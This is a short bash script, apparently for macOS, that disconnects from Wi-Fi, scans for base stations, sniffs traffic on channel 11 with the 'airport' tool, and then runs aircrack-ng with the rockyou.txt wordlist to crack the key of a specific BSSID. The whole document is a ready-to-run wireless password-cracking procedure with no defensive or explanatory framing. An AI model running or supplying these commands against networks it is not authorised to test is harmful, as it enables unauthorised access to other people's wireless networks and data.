#!/bin/bash

# detach from any connected 802.11 (wifi) base stations
# NOTE: this needs to be run as 'root'
airport -z

# list all 802.11 (wifi) base stations available
airport -s

# sniff an 802.11 (wifi) channel
# airport ${INTERFACE} sniff ${CHANNEL}
airport en0 sniff 11

# aircrack-ng -1 -a 1 -b ${BSSID} ${SNIFF_FILE} -w ${WORDLIST_FILE}
aircrack-ng -1 -a 1 -b cc:75:e2:9d:6f:9d /tmp/airportSniffPaNLfP.cap -w ./rockyou.txt
